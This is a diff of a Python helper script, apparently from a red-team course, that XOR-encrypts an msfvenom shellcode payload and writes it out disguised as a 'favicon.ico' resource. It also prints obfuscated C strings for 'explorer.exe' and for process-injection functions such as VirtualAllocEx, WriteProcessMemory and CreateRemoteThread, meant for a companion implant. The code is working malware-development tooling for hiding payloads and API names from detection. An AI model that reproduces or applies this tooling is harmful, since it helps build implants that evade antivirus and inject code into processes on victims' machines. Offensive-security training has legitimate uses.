@@ -1,38 +1,57 @@
-# Red Team Operator course code template
-# payload encryption with XOR
-#
-# author: reenz0h (twitter: @sektor7net)
-
 import sys
-
-KEY = "mysecretkeee"
 
 def xor(data, key):
     key = str(key).encode()
-    l = len(key)
     output_bytes = bytearray()
 
     for i in range(len(data)):
         current = data[i] if isinstance(data, bytes) else ord(data[i])
-        current_key = key[i % l]
+        current_key = key[i % len(key)]
         output_bytes.append(current ^ current_key)
-
     return output_bytes
 
+def print_c_str(name, value):
+    print(f"unsigned char {name}[] = {{ 0x" + ", 0x".join(hex(x)[2:] for x in value) + ", 0x0 };") # Ensure the C-String is null-terminated.
 
-def printCiphertext(ciphertext):
-    print('{ ' + ', '.join('0x{{:02x}'.format(x) for x in ciphertext) + ' };')
+KEY = "mysecretkeee"  # Must match in `implant.cpp`.
 
-
+# `msfvenom -p windows/x64/messagebox TEXT="Hello, World!" TITLE="Welcome" EXITFUNC=thread -f raw -o msgbox64.bin`
+payload_filename = "msgbox64.bin"
+payload_pt = b""
 try:
-    plaintext = open(sys.argv[1], "rb").read()
+    payload_pt = open(payload_filename, "rb").read()
 except:
-    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    print(f"Payload file '{payload_filename}' not found.")
     sys.exit()
+payload_ct = xor(payload_pt, KEY)
+# Write payload ct to resource file `favicon.ico`.
+favicon = "favicon.ico"
+with open(favicon, "wb") as fi:
+    fi.write(payload_ct)
 
-ciphertext = xor(plaintext, KEY)
-print('{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
+print_c_str("sKernel32Dll", xor("kernel32.dll", KEY))
+print_c_str("sExplorerExe", xor("explorer.exe", KEY))
 
-filename = "favicon.ico"
-with open(filename, "wb") as icon:
-    icon.write(ciphertext)
+functions = [
+    "VirtualAllocEx",
+    "WriteProcessMemory",
+    "CreateRemoteThread",
+    "CloseHandle",
+    "OpenProcess",
+    "RtlMoveMemory",
+    "VirtualAlloc",
+    "SizeofResource",
+    "LockResource",
+    "LoadResource",
+    "FindResourceA",
+    "WaitForSingleObject",
+    "lstrcmpiA",
+    "Process32Next",
+    "Process32First",
+    "CreateToolhelp32Snapshot",
+    "GetProcAddress",
+    "GetModuleHandleA",
+]
+for f in functions:
+    function_ct = xor(f, KEY)
+    print_c_str(f"s{f}", function_ct)
